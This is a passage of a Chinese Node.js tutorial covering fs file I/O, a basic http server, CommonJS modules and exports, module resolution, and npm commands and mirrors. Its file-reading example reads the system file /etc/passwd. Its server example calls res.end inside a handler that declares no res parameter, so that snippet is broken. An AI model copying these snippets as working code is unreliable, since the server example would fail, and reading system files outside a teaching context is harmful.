class="headerlink" title="文件读写"></a>文件读写</h4><p>文件读取：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">throw</span> err  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>文件写入：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>fs<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token string">'message.txt'</span><span class="token punctuation">,</span> <span class="token string">'Hello Node.js'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">throw</span> err  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'The file has been saved!'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><hr><h4 id="HTTP-服务"><a href="#HTTP-服务" class="headerlink" title="HTTP 服务"></a>HTTP 服务</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 接下来，我们要干一件使用 Node 很有成就感的一件事儿</span><span class="token comment" spellcheck="true">// 你可以使用 Node 非常轻松的构建一个 Web 服务器</span><span class="token comment" spellcheck="true">// 在 Node 中专门提供了一个核心模块：http</span><span class="token comment" spellcheck="true">// http 这个模块的职责就是帮你创建编写服务器的</span><span class="token comment" spellcheck="true">// 1. 加载 http 核心模块</span><span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 2. 使用 http.createServer() 方法创建一个 Web 服务器</span><span class="token comment" spellcheck="true">//    返回一个 Server 实例</span><span class="token keyword">var</span> server <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 3. 服务器要干嘛？</span><span class="token comment" spellcheck="true">//    提供服务：对 数据的服务</span><span class="token comment" spellcheck="true">//    发请求</span><span class="token comment" spellcheck="true">//    接收请求</span><span class="token comment" spellcheck="true">//    处理请求</span><span class="token comment" spellcheck="true">//    给个反馈（发送响应）</span><span class="token comment" spellcheck="true">//    注册 request 请求事件</span><span class="token comment" spellcheck="true">//    当客户端请求过来，就会自动触发服务器的 request 请求事件，然后执行第二个参数：回调处理函数</span>server<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'Hello Node.js!'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 4. 绑定端口号，启动服务器</span>server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'服务器启动成功，请求访问 http://127.0.0.1:3000/'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="Node-js-中的-JavaScript"><a href="#Node-js-中的-JavaScript" class="headerlink" title="Node.js 中的 JavaScript"></a>Node.js 中的 JavaScript</h4><h6 id="ECMAScript"><a href="#ECMAScript" class="headerlink" title="ECMAScript"></a>ECMAScript</h6><h6 id="全局成员"><a href="#全局成员" class="headerlink" title="全局成员"></a>全局成员</h6><blockquote><p><a href="https://nodejs.org/dist/latest-v10.x/docs/api/globals.html" target="_blank" rel="noopener">Global Objects</a></p></blockquote><h6 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h6><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><h2 id="第4章-模块系统"><a href="#第4章-模块系统" class="headerlink" title="第4章 模块系统"></a>第4章 模块系统</h2><p><strong>学习目标</strong></p><ul><li>理解模块化编程方式</li><li>掌握模块通信规则</li><li>知道模块的三种分类</li><li>了解模块加载过程</li></ul><h4 id="什么是模块化"><a href="#什么是模块化" class="headerlink" title="什么是模块化"></a>什么是模块化</h4><p>当你的网站开发越来越复杂代码越来越多的时候会经常遇到什么问题？</p><ul><li>恼人的命名冲突</li><li>繁琐的文件依赖</li></ul><p>历史上，JavaScript一直没有模块（module）体系， 无法将一个大程序拆分成互相依赖的小文件，再用简单的方法拼装起来。 其他语言都有这项功能，比如Ruby的 <code>require</code>、Python的 <code>import</code> ， 甚至就连CSS都有 <code>@import</code> ，但是JavaScript任何这方面的支持都没有，这对开发大型的、复杂的项目形成了巨大障碍。</p><p><img src="http://img1.gtimg.com/digi/pics/hv1/241/121/1791/116490871.jpg" alt="模块化"></p><blockquote><p>现实角度（手机、电脑、活动板房）：</p><ul><li>生产效率高<ul><li>可维护性好</li></ul></li></ul><p>程序角度（就是把大一个文件中很多的代码拆分到不同的小文件中，每个小文件就称之为一个模块，例如我们看到的 jQuery 真正的源码）</p><ul><li>开发效率高（不需要在一个文件中翻来翻去，例如 jQuery 不可能在一个文件写 1w+ 代码，按照功能划分到不同文件中）</li><li>可维护性好（哪个功能出问题，直接定位该功能模块即可）</li></ul></blockquote><p>模块化的概念有了，那程序中的模块到底该具有哪些特性就满足我们的使用了呢？</p><ul><li>模块作用域<ul><li>好处就是模块不需要考虑全局命名空间冲突的问题</li></ul></li><li>模块通信规则<ul><li>所有模块如果都是封闭自然不行，我们需要让组件与组件相互组织联系起来，例如 CPU 需要读取内存中的数据来进行计算，然后把计算结果又交给了我们的操作系统</li><li>所以我们的模块也是需要具有通信的能力的</li><li>所谓的通信说白了也就是输入与输出</li></ul></li></ul><p>下面我们具体来看一下在 Node.js 中如何在多模块之间进行输入与输出。</p><h4 id="模块通信规则"><a href="#模块通信规则" class="headerlink" title="模块通信规则"></a>模块通信规则</h4><h6 id="require-模块导入"><a href="#require-模块导入" class="headerlink" title="require 模块导入"></a><code>require</code> 模块导入</h6><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 核心模块</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 第三方模块</span><span class="token comment" spellcheck="true">// npm install marked</span><span class="token keyword">var</span> marked <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'marked'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 用户模块（自己写的），正确的，正确的方式</span><span class="token comment" spellcheck="true">// 注意：加载自己写的模块，相对路径不能省略 ./</span><span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./foo.js'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 用户模块（自己写的），正确的（推荐），可以省略后缀名 .js</span><span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./foo'</span><span class="token punctuation">)</span></code></pre><h6 id="exports-模块导出"><a href="#exports-模块导出" class="headerlink" title="exports 模块导出"></a><code>exports</code> 模块导出</h6><p>导出多个成员：写法一（麻烦，不推荐）：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 导出多个成员：写法一</span>module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">123</span>module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">456</span>module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>c <span class="token operator">=</span> <span class="token number">789</span></code></pre><p><strong>导出多个成员：写法二（推荐）</strong></p><p>Node 为了降低开发人员的痛苦，所以为 <code>module.exports</code> 提供了一个别名 <code>exports</code> （下面协大等价于上面的写法）。</p><pre class=" language-javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>exports <span class="token operator">===</span> module<span class="token punctuation">.</span>exports<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// => true</span>exports<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">123</span>exports<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">456</span>exports<span class="token punctuation">.</span>c <span class="token operator">=</span> <span class="token number">789</span>exports<span class="token punctuation">.</span>fn <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span></code></pre><p>导出多个成员：写法三（代码少可以，但是代码一多就不推荐了）：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// module.exports = {</span><span class="token comment" spellcheck="true">//   d: 'hello',</span><span class="token comment" spellcheck="true">//   e: 'world',</span><span class="token comment" spellcheck="true">//   fn: function () {</span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // </span><span class="token comment" spellcheck="true">//     // fs.readFile(function () {</span><span class="token comment" spellcheck="true">//     // })</span><span class="token comment" spellcheck="true">//   }</span><span class="token comment" spellcheck="true">// }</span></code></pre><p><strong>导出单个成员：（唯一的写法）：</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 导出单个成员：错误的写法</span><span class="token comment" spellcheck="true">// 因为每个模块最终导出是 module.exports 而不是 exports 这个别名</span><span class="token comment" spellcheck="true">// exports = function (x, y) {</span><span class="token comment" spellcheck="true">//   return x + y</span><span class="token comment" spellcheck="true">// }</span><span class="token comment" spellcheck="true">// 导出单个成员：必须这么写</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> x <span class="token operator">+</span> y<span class="token punctuation">}</span></code></pre><p>注意：导出单个只能导出一次，下面的情况后者会覆盖前者：</p><pre class=" language-javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token comment" spellcheck="true">// 以这个为准，后者会覆盖前者</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> x <span class="token operator">+</span> y<span class="token punctuation">}</span></code></pre><h6 id="为什么-exports-xxx-不行"><a href="#为什么-exports-xxx-不行" class="headerlink" title="为什么 exports = xxx 不行"></a>为什么 <code>exports = xxx</code> 不行</h6><blockquote><p>画图</p></blockquote><p>exports 和 <code>module.exports</code> 的一个引用：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 每个模块内部有一个 module 对象</span>  <span class="token comment" spellcheck="true">// module 对象中有一个成员 exports 也是一个对象</span>  <span class="token keyword">var</span> module <span class="token operator">=</span> <span class="token punctuation">{</span>    exports<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 模块中同时还有一个成员 exports 等价于 module.exports</span>  <span class="token keyword">var</span> exports <span class="token operator">=</span> module<span class="token punctuation">.</span>exports  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>exports <span class="token operator">===</span> module<span class="token punctuation">.</span>exports<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// => true</span>  <span class="token comment" spellcheck="true">// 这样是可以的，因为 exports === module.exports</span>  <span class="token comment" spellcheck="true">// module.exports.a = 123</span>  <span class="token comment" spellcheck="true">// exports.b = 456</span>  <span class="token comment" spellcheck="true">// 这里重新赋值不管用，因为模块最后 return 的是 module.exports</span>  <span class="token comment" spellcheck="true">// exports = function () {</span>  <span class="token comment" spellcheck="true">// }</span>  <span class="token comment" spellcheck="true">// 这才是正确的方式</span>  module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 最后导出的是 module.exports</span>  <span class="token keyword">return</span> module<span class="token punctuation">.</span>exports<span class="token punctuation">}</span><span class="token keyword">var</span> ret <span class="token operator">=</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span></code></pre><h6 id="exports-和-module-exports-的区别"><a href="#exports-和-module-exports-的区别" class="headerlink" title="exports 和 module.exports 的区别"></a>exports 和 module.exports 的区别</h6><ul><li>exports 和 module.exports 的区别<ul><li>每个模块中都有一个 module 对象</li><li>module 对象中有一个 exports 对象</li><li>我们可以把需要导出的成员都挂载到 module.exports 接口对象中</li><li>也就是：<code>moudle.exports.xxx = xxx</code> 的方式</li><li>但是每次都 <code>moudle.exports.xxx = xxx</code> 很麻烦，点儿的太多了</li><li>所以 Node 为了你方便，同时在每一个模块中都提供了一个成员叫：<code>exports</code></li><li><code>exports === module.exports</code> 结果为  <code>true</code></li><li>所以对于：<code>moudle.exports.xxx = xxx</code> 的方式 完全可以：<code>expots.xxx = xxx</code></li><li>当一个模块需要导出单个成员的时候，这个时候必须使用：<code>module.exports = xxx</code> 的方式</li><li>不要使用 <code>exports = xxx</code> 不管用</li><li>因为每个模块最终向外 <code>return</code> 的是 <strong>module.exports</strong></li><li>而 <code>exports</code> 只是 <code>module.exports</code> 的一个引用</li><li>所以即便你为 <code>exports = xx</code> 重新赋值，也不会影响 <code>module.exports</code></li><li>但是有一种赋值方式比较特殊：<code>exports = module.exports</code> 这个用来重新建立引用关系的</li><li>之所以让大家明白这个道理，是希望可以更灵活的去用它</li></ul></li></ul><h6 id="特殊的导出方式"><a href="#特殊的导出方式" class="headerlink" title="特殊的导出方式"></a>特殊的导出方式</h6><pre class=" language-javascript"><code class="language-javascript">exports <span class="token operator">=</span> module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'默认函数被调用了'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>exports<span class="token punctuation">.</span>ajax <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ajax 方法被调用了'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>exports<span class="token punctuation">.</span><span class="token keyword">get</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'get 方法被调用了'</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h4 id="模块分类"><a href="#模块分类" class="headerlink" title="模块分类"></a>模块分类</h4><p>在开始了解具体的规则之前，我们先来了解一下在 Node 中对不模块的一个具体分类，一共就三种类别：</p><ul><li>核心模块<ul><li>由 Node 本身提供，具名的，例如 fs 文件操作模块、http 网络操作模块</li></ul></li><li>第三方模块<ul><li>由第三方提供，使用的时候我们需要通过 npm 进行下载然后才可以加载使用，例如我们使用过的 <code>mime</code>、<code>art-template</code>、<code>marked</code></li><li>注意：不可能有第三方包的名字和核心模块的名字是一样的，否则会造成冲突</li></ul></li><li>用户模块（自己写的）<ul><li>我们在文件中写的代码很多的情况下不好编写和维护，所以我们可以考虑把文件中的代码拆分到多个文件中，那这些我们自己创建的文件就是用户模块</li></ul></li></ul><h6 id="核心模块"><a href="#核心模块" class="headerlink" title="核心模块"></a>核心模块</h6><blockquote><p>参考文档：<a href="https://nodejs.org/dist/latest-v9.x/docs/api/" target="_blank" rel="noopener">https://nodejs.org/dist/latest-v9.x/docs/api/</a></p></blockquote><ul><li>核心模块就是 node 内置的模块，需要通过唯一的标识名称来进行获取。</li><li>每一个核心模块基本上都是暴露了一个对象，里面包含一些方法供我们使用</li><li>一般在加载核心模块的时候，变量的起名最好就和核心模块的标识名同名即可<ul><li>例如：<code>const fs = require('fs')</code></li></ul></li><li>核心模块本质上也是文件模块<ul><li>核心模块已经被编译到了 node 的可执行程序，一般看不到</li><li>可以通过查看 node 的源码看到核心模块文件</li><li>核心模块也是基于 CommonJS 模块规范</li></ul></li></ul><p>Node 中都以具名的方式提供了不同功能的模块，例如操作文件就是：<code>fs</code></p><p>核心模块（系统模块）由 Node 提供，使用的时候都必须根据特定的核心模块名称来加载使用。例如使用文件操作模块：<code>fs</code></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// fs.readFile</span><span class="token comment" spellcheck="true">// fs.writeFile</span><span class="token comment" spellcheck="true">// fs.appendFile</span></code></pre><table><thead><tr><th>模块名称</th><th>作用</th></tr></thead><tbody><tr><td><a href="https://nodejs.org/dist/latest-v9.x/docs/api/fs.html" target="_blank" rel="noopener">fs</a></td><td>文件操作</td></tr><tr><td><a href="https://nodejs.org/dist/latest-v9.x/docs/api/http.html" target="_blank" rel="noopener">http</a></td><td>网络操作</td></tr><tr><td><a href="https://nodejs.org/dist/latest-v9.x/docs/api/path.html" target="_blank" rel="noopener">path</a></td><td>路径操作</td></tr><tr><td><a href="https://nodejs.org/dist/latest-v9.x/docs/api/url.html" target="_blank" rel="noopener">url</a></td><td>url 地址操作</td></tr><tr><td><a href="https://nodejs.org/dist/latest-v9.x/docs/api/os.html" target="_blank" rel="noopener">os</a></td><td>操作系统信息</td></tr><tr><td><a href="https://nodejs.org/dist/latest-v9.x/docs/api/net.html" target="_blank" rel="noopener">net</a></td><td>一种更底层的网络操作方式</td></tr><tr><td><a href="https://nodejs.org/dist/latest-v9.x/docs/api/querystring.html" target="_blank" rel="noopener">querystring</a></td><td>解析查询字符串</td></tr><tr><td><a href="https://nodejs.org/dist/latest-v9.x/docs/api/util.html" target="_blank" rel="noopener">util</a></td><td>工具函数模块</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><h6 id="文件模块"><a href="#文件模块" class="headerlink" title="文件模块"></a>文件模块</h6><p>以 <code>./</code> 或 <code>../</code> 开头的模块标识就是文件模块，一般就是用户编写的。</p><h6 id="第三方模块"><a href="#第三方模块" class="headerlink" title="第三方模块"></a>第三方模块</h6><ul><li>moment</li><li>marked</li><li>…</li></ul><p>一般就是通过 <code>npm install</code> 安装的模块就是第三方模块。</p><p>加载规则如下：</p><ul><li>如果不是文件模块，也不是核心模块</li><li>node 会去 node_modules 目录中找（找跟你引用的名称一样的目录），例如这里 <code>require('underscore')</code></li><li>如果在 node_modules 目录中找到 <code>underscore</code> 目录，则找该目录下的 <code>package.json</code> 文件</li><li>如果找到 <code>package.json</code> 文件，则找该文件中的 <code>main</code> 属性，拿到 main 指定的入口模块</li><li>如果过程都找不到，node 则取上一级目录下找 <code>node_modules</code> 目录，规则同上。。。</li><li>如果一直找到代码文件的根路径还找不到，则报错。。。</li></ul><p>注意：对于第三方模块，我们都是 <code>npm install</code> 命令进行下载的，就放到项目根目录下的 <code>node_modules</code> 目录。</p><h4 id="深入模块加载机制"><a href="#深入模块加载机制" class="headerlink" title="深入模块加载机制"></a>深入模块加载机制</h4><p>简单流程</p><p><img src="/images/nodejs-require.jpg" alt="img"></p><p>详细流程</p><p><img src="/images/2015-07-15_55a6794639322.jpg" alt="img"></p><p>简而言之，如果require绝对路径的文件，查找时不会去遍历每一个node_modules目录，其速度最快。其余流程如下：</p><ol><li>从module path数组中取出第一个目录作为查找基准。</li><li>直接从目录中查找该文件，如果存在，则结束查找。如果不存在，则进行下一条查找。</li><li>尝试添加.js、.json、.node后缀后查找，如果存在文件，则结束查找。如果不存在，则进行下一条。</li><li>尝试将require的参数作为一个包来进行查找，读取目录下的package.json文件，取得main参数指定的文件。</li><li>尝试查找该文件，如果存在，则结束查找。如果不存在，则进行第3条查找。</li><li>如果继续失败，则取出module path数组中的下一个目录作为基准查找，循环第1至5个步骤。</li><li>如果继续失败，循环第1至6个步骤，直到module path中的最后一个值。</li><li>如果仍然失败，则抛出异常。</li></ol><p>整个查找过程十分类似原型链的查找和作用域的查找。所幸Node.js对路径查找实现了缓存机制，否则由于每次判断路径都是同步阻塞式进行，会导致严重的性能消耗。</p><h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><h2 id="第5章-包与npm"><a href="#第5章-包与npm" class="headerlink" title="第5章 包与npm"></a>第5章 包与npm</h2><p><strong>学习目标</strong></p><ul><li>掌握 npm 的常用命令</li><li>理解安装本地包和全局包的区别</li><li>理解 package.json 文件作用</li></ul><h4 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h4><blockquote><p>参考链接：</p><ul><li><a href="https://docs.npmjs.com/getting-started/" target="_blank" rel="noopener">https://docs.npmjs.com/getting-started/</a></li></ul></blockquote><p>npm 全称 <code>Node Package Manager</code>，它的诞生是为了解决 Node 中第三方包共享的问题。<br>和浏览器一样，由于都是 JavaScript，所以前端开发也使用 npm 作为第三方包管理工具。<br>例如大名鼎鼎的 jQuery、Bootstrap 等都可以通过 npm 来安装。<br>所以官方把 npm 定义为 <code>JavaScript Package Manager</code>。</p><p><code>npm</code> 有两层含义。一层含义是Node的开放式模块登记和管理系统，网址为<a href="http://npmjs.org/" target="_blank" rel="noopener">npmjs.org</a>。另一层含义是Node默认的模块管理器，是一个命令行下的软件，用来安装和管理Node模块。</p><p><code>npm</code>不需要单独安装。在安装Node的时候，会连带一起安装<code>npm</code>。</p><p>执行下面的命令可以用来查看本地安装的 npm 的版本号。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> --version</code></pre><p>如果想升级 npm ，可以这样</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token function">npm</span> --global</code></pre><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><blockquote><p>表格</p></blockquote><pre class=" language-shell"><code class="language-shell">## 在项目中初始化一个 package.json 文件## 凡是使用 npm 来管理的项目都会有这么一个文件npm init## 跳过向导，快速生成 package.json 文件## 简写是 -ynpm init --yes## 一次性安装 dependencies 中所有的依赖项## 简写是 npm inpm install## 安装指定的包，可以简写为 npm i 包名## npm 5 以前只下载，不会保存依赖信息，如果需要保存，则需要加上 `--save` 选项## npm 5 以后就可以省略 --save 选项了npm install 包名## 一次性安装多个指定包npm install 包名 包名 包名 ...## 安装指定版本的包npm install 包名@版本号## npm list命令以树型结构列出当前项目安装的所有模块，以及它们依赖的模块。npm list## 加上global参数，会列出全局安装的模块npm list -global## npm list命令也可以列出单个模块npm list 包名## 安装全局包npm install --global 包名## 更新本地安装的模块## 它会先到远程仓库查询最新版本，然后查询本地版本。如果本地版本不存在，或者远程版本较新，就会安装npm update [package name]## 升级全局安装的模块npm update -global [package name]## 卸载指定的包npm uninstall 包名## 查看包信息## view 别名：v、info、shownpm view 包名## 查看使用帮助npm help## 查看某个命令的使用帮助## 例如我忘记了 uninstall 命令的简写了，这个时候，可以输入 `npm uninstall --help` 来查看使用帮助npm 命令 --help</code></pre><h4 id="全局命令行工具"><a href="#全局命令行工具" class="headerlink" title="全局命令行工具"></a>全局命令行工具</h4><p>每个模块可以“全局安装”，也可以“本地安装”。“全局安装”指的是将一个模块安装到系统目录中，各个项目都可以调用。一般来说，全局安装只适用于工具模块，比如<code>eslint</code>和<code>gulp</code>。“本地安装”指的是将一个模块下载到当前项目的<code>node_modules</code>子目录，然后只有在项目目录之中，才能调用这个模块。</p><blockquote><p>提示：安装全局包必须加 <code>--global</code> 参数</p></blockquote><h6 id="http-server"><a href="#http-server" class="headerlink" title="http-server"></a>http-server</h6><blockquote><p><a href="https://github.com/indexzero/http-server##readme" target="_blank" rel="noopener">https://github.com/indexzero/http-server##readme</a></p></blockquote><h6 id="nodemon"><a href="#nodemon" class="headerlink" title="nodemon"></a>nodemon</h6><blockquote><p><a href="http://nodemon.io/" target="_blank" rel="noopener">http://nodemon.io/</a></p></blockquote><h6 id="less"><a href="#less" class="headerlink" title="less"></a>less</h6><blockquote><p><a href="http://lesscss.org/" target="_blank" rel="noopener">http://lesscss.org/</a></p></blockquote><h6 id="browser-sync"><a href="#browser-sync" class="headerlink" title="browser-sync"></a>browser-sync</h6><blockquote><p><a href="https://browsersync.io/" target="_blank" rel="noopener">https://browsersync.io/</a></p></blockquote><h4 id="切换-npm-镜像源"><a href="#切换-npm-镜像源" class="headerlink" title="切换 npm 镜像源"></a>切换 npm 镜像源</h4><ul><li><code>npm install jquery --registry=https://registry.npm.taobao.org</code></li><li><code>npm config set registry https://registry.npm.taobao.org</code></li><li><a href="https://github.com/Pana/nrm" target="_blank" rel="noopener">nrm</a></li></ul><p>npm 存储包文件的服务器在国外，有时候会被墙，速度很慢，所以我们需要解决这个问题。</p><p>国内淘宝的开发团队把 npm 在国内做了一个备份，网址是：<a href="http://npm.taobao.org/。" target="_blank" rel="noopener">http://npm.taobao.org/。</a></p><p>最简单的方式就是我们在安装包的时候告诉 npm 你去哪个服务器下载。</p><p>例如使用淘宝的 npm 镜像源下载 jquery:</p><pre class=" language-shell"><code class="language-shell">npm install jquery --registry=https://registry.npm.taobao.org</code></pre><p>但是每次手动往后面加 <code>--registry=https://registry.npm.taobao.org</code> 很麻烦，<br>所以我们可以通过修改配置文件的方式来处理解决。</p><pre class=" language-shell"><code class="language-shell">## 配置到淘宝服务器npm config set registry https://registry.npm.taobao.org## 查看 registry 是否配置正确npm config get registry</code></pre><p>只要经过了上面命令的配置，则你以后所有的 <code>npm install</code> 都会使用你配置的 <code>registry</code> 下载。</p><h4 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h4><p>每个项目的根目录下面，一般都有一个<code>package.json</code>文件，定义了这个项目所需要的各种模块，以及项目的配置信息（比如名称、版本、许可证等元数据）。<code>npm install</code>命令根据这个配置文件，自动下载所需的模块，也就是配置项目所需的运行和开发环境。</p><p>package.json文件可以手工编写，也可以使用<code>npm init</code>命令自动生成。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> init</code></pre><p>这个命令采用互动方式，要求用户回答一些问题，然后在当前目录生成一个基本的package.json文件。所有问题之中，只有项目名称（name）和项目版本（version）是必填的，其他都是选填的。</p><p>这个文件可以通过 <code>npm init</code> 的方式来自动初始化出来。</p><p>下面是一个最简单的package.json文件，只定义两项元数据：项目名称和项目版本。</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"name"</span> <span class="token operator">:</span> <span class="token string">"xxx"</span><span class="token punctuation">,</span>  <span class="token property">"version"</span> <span class="token operator">:</span> <span class="token string">"0.0.0"</span><span class="token punctuation">,</span><span class="token 